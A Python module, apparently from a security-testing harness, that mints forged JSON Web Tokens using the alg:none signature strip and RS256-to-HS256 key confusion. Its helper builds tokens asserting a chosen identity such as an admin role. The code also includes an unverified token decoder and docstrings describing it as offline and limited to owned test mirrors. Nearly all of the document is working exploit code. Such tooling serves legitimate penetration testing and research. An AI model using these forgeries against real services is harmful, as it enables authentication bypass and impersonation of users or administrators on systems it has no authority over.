#!/usr/bin/env python3
"""jwt_forge.py -- build-target 4: JWT signature-bypass forgery helpers for the broken-auth-jwt class.

PURE, offline crafters for the two classic key-independent forgeries, plus a decoder for the
JwtForgeryOracle's identity witness. NON-DESTRUCTIVE: minting a token and sending it is a read/authz
probe -- it changes no state. The live leg (send forged + no-token control, capture accepted?/identity)
wires these into vectors + JwtForgeryOracle; kept separate so the crafters are unit-testable with no
network. Doctrine: contained/owned mirror only.

  * alg:none        -- strip the signature, header alg="none"; a server that skips verification when
                       alg=none trusts the unsigned claims.
  * RS256 -> HS256  -- the server verifies an RS256 token with HS256 using the (public) RSA key as the
                       HMAC secret; the attacker, who has the public key, can therefore sign it.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json


def _b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def _b64url_json(obj) -> str:
    return _b64url(json.dumps(obj, separators=(",", ":"), sort_keys=True).encode("utf-8"))


def _b64url_decode(seg: str) -> bytes:
    pad = "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg + pad)


def decode_segments(token: str):
    """Decode a JWT into (header, payload, signature_b64) WITHOUT verifying -- for the oracle's identity
    witness (does the accepted token's payload carry the forged sub/role?). Returns dicts + the raw sig
    segment; ({}, {}, "") on a malformed token."""
    try:
        parts = (token or "").split(".")
        if len(parts) < 2:
            return {}, {}, ""
        header = json.loads(_b64url_decode(parts[0]) or b"{}")
        payload = json.loads(_b64url_decode(parts[1]) or b"{}")
        sig = parts[2] if len(parts) > 2 else ""
        return header, payload, sig
    except Exception:
        return {}, {}, ""


def forge_alg_none(claims: dict, typ: str = "JWT") -> str:
    """Mint an alg:none token: header.payload. with an EMPTY signature segment."""
    header = {"alg": "none", "typ": typ}
    return _b64url_json(header) + "." + _b64url_json(dict(claims or {})) + "."


def forge_rs256_to_hs256(claims: dict, public_key_pem: str, typ: str = "JWT") -> str:
    """Mint an RS256->HS256-confusion token: sign header.payload with HMAC-SHA256 keyed by the app's
    PUBLIC RSA key bytes (exactly as the server would then re-derive it if it HS256-verifies an RS256
    token). Caller passes the PEM as the server exposes it (e.g. /encryptionkeys/jwt.pub)."""
    header = {"alg": "HS256", "typ": typ}
    signing_input = (_b64url_json(header) + "." + _b64url_json(dict(claims or {}))).encode("ascii")
    key = public_key_pem.encode("utf-8") if isinstance(public_key_pem, str) else bytes(public_key_pem)
    sig = hmac.new(key, signing_input, hashlib.sha256).digest()
    return signing_input.decode("ascii") + "." + _b64url(sig)


def craft_forgeries(claims: dict, public_key_pem: str = None):
    """Return [(vector, token)] to try: alg:none always; RS256->HS256 when a public key is available.
    `claims` should assert the FORGED identity (e.g. {"sub":..., "role":"admin", "email":...}) so the
    oracle's identity_match can confirm the server assumed it."""
    out = [("alg:none", forge_alg_none(claims))]
    if public_key_pem:
        out.append(("rs256->hs256", forge_rs256_to_hs256(claims, public_key_pem)))
    return out
